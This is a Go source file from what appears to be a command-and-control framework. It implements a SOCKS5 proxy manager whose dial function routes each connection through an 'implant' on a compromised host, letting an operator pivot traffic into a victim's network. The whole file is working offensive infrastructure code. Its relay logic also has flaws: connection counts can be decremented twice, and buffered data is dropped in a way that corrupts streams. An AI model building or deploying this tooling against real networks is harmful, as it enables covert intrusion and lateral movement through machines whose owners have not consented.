package socks5

import (
	"context"
	"fmt"
	"log"
	"net"
	"sync"
	"sync/atomic"
	"time"

	"c2/pkg/protocol"

	"github.com/armon/go-socks5"
	"github.com/google/uuid"
)

// TunnelSession holds state for an in-progress or active tunnel.
type TunnelSession struct {
	tunnelID  string
	target    string
	connectCh chan protocol.TunnelConnected
	dataCh    chan []byte
	closeCh   chan struct{}
	manager   *SocksManager
}

// SocksManager manages a SOCKS5 proxy for a single agent.
type SocksManager struct {
	agentID   string
	port      int
	server    *socks5.Server
	listener  net.Listener
	tunnels   map[string]*TunnelSession
	mu        sync.RWMutex
	sendMsg   func(msgType uint32, body interface{}) error
	connCount int32
	ctx       context.Context
	cancel    context.CancelFunc
}

// SocksStatus represents the current state of a SOCKS proxy.
type SocksStatus struct {
	Active          bool   `json:"active"`
	Port            int    `json:"port"`
	ConnectionCount int    `json:"connection_count"`
	Error           string `json:"error,omitempty"`
}

// NewSocksManager creates a new SOCKS proxy manager for an agent.
func NewSocksManager(agentID string, port int, sendMsg func(msgType uint32, body interface{}) error) *SocksManager {
	return &SocksManager{
		agentID: agentID,
		port:    port,
		sendMsg: sendMsg,
		tunnels: make(map[string]*TunnelSession),
	}
}

// Start begins listening and serving SOCKS5 connections.
func (m *SocksManager) Start(ctx context.Context) error {
	m.ctx, m.cancel = context.WithCancel(ctx)

	conf := &socks5.Config{
		Dial: m.Dial,
	}
	server, err := socks5.New(conf)
	if err != nil {
		m.cancel()
		return fmt.Errorf("creating SOCKS5 server: %w", err)
	}
	m.server = server

	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", m.port))
	if err != nil {
		m.cancel()
		return fmt.Errorf("listening on port %d: %w", m.port, err)
	}
	m.listener = listener

	go func() {
		log.Printf("[SOCKS5] Proxy for agent %s started on port %d", m.agentID, m.port)
		if err := server.Serve(listener); err != nil {
			select {
			case <-m.ctx.Done():
				// Normal shutdown
			default:
				log.Printf("[SOCKS5] Server error for agent %s: %v", m.agentID, err)
			}
		}
	}()

	return nil
}

// Stop shuts down the SOCKS5 server and all active tunnels.
func (m *SocksManager) Stop() error {
	if m.cancel != nil {
		m.cancel()
	}

	// Close all active tunnels
	m.mu.Lock()
	for _, session := range m.tunnels {
		select {
		case <-session.closeCh:
		default:
			close(session.closeCh)
		}
	}
	m.tunnels = make(map[string]*TunnelSession)
	m.mu.Unlock()

	if m.listener != nil {
		m.listener.Close()
	}
	log.Printf("[SOCKS5] Proxy for agent %s stopped", m.agentID)
	return nil
}

// Status returns the current proxy status.
func (m *SocksManager) Status() SocksStatus {
	select {
	case <-m.ctx.Done():
		return SocksStatus{Active: false}
	default:
	}
	return SocksStatus{
		Active:          true,
		Port:            m.port,
		ConnectionCount: int(atomic.LoadInt32(&m.connCount)),
	}
}

// Dial is the custom dial function for go-socks5. Instead of making a real
// TCP connection, it creates a tunnel through the implant.
func (m *SocksManager) Dial(ctx context.Context, network, addr string) (net.Conn, error) {
	tunnelID := uuid.New().String()
	session := &TunnelSession{
		tunnelID:  tunnelID,
		target:    addr,
		connectCh: make(chan protocol.TunnelConnected, 1),
		dataCh:    make(chan []byte, 128),
		closeCh:   make(chan struct{}),
		manager:   m,
	}

	m.mu.Lock()
	m.tunnels[tunnelID] = session
	m.mu.Unlock()
	atomic.AddInt32(&m.connCount, 1)

	// Send tunnel connect command to implant
	connectMsg := protocol.TunnelConnect{TunnelID: tunnelID, Target: addr}
	if err := m.sendMsg(protocol.MsgTunnelConnect, connectMsg); err != nil {
		m.removeTunnel(tunnelID)
		return nil, fmt.Errorf("send tunnel connect: %w", err)
	}

	// Wait for connect result
	select {
	case result := <-session.connectCh:
		if !result.Success {
			m.removeTunnel(tunnelID)
			return nil, fmt.Errorf("tunnel connect to %s failed: %s", addr, result.Error)
		}
	case <-ctx.Done():
		m.removeTunnel(tunnelID)
		return nil, ctx.Err()
	case <-time.After(30 * time.Second):
		m.removeTunnel(tunnelID)
		return nil, fmt.Errorf("tunnel connect timeout")
	}

	onClose := func(tid string) {
		m.removeTunnel(tid)
	}

	return NewRelayConn(tunnelID, addr, session.dataCh, m.sendTunnelMsg, onClose), nil
}

// sendTunnelMsg sends a tunnel message to the implant.
func (m *SocksManager) sendTunnelMsg(msgType uint32, body interface{}) error {
	return m.sendMsg(msgType, body)
}

// HandleTunnelConnected processes a tunnel connect result from the implant.
func (m *SocksManager) HandleTunnelConnected(msg protocol.TunnelConnected) {
	m.mu.RLock()
	session, ok := m.tunnels[msg.TunnelID]
	m.mu.RUnlock()
	if !ok {
		return
	}
	select {
	case session.connectCh <- msg:
	default:
	}
}

// RouteData delivers tunnel data from the implant to the correct RelayConn.
func (m *SocksManager) RouteData(tunnelID string, data []byte) {
	m.mu.RLock()
	session, ok := m.tunnels[tunnelID]
	m.mu.RUnlock()
	if !ok {
		return
	}
	select {
	case session.dataCh <- data:
	default:
		// Channel full, drop oldest data
		select {
		case <-session.dataCh:
		default:
		}
		select {
		case session.dataCh <- data:
		default:
		}
	}
}

// HandleTunnelClose processes a tunnel close request from the implant.
func (m *SocksManager) HandleTunnelClose(msg protocol.TunnelClose) {
	m.mu.RLock()
	session, ok := m.tunnels[msg.TunnelID]
	m.mu.RUnlock()
	if ok {
		select {
		case <-session.closeCh:
		default:
			close(session.closeCh)
		}
	}
	m.removeTunnel(msg.TunnelID)
}

func (m *SocksManager) removeTunnel(tunnelID string) {
	m.mu.Lock()
	delete(m.tunnels, tunnelID)
	m.mu.Unlock()
	atomic.AddInt32(&m.connCount, -1)
}
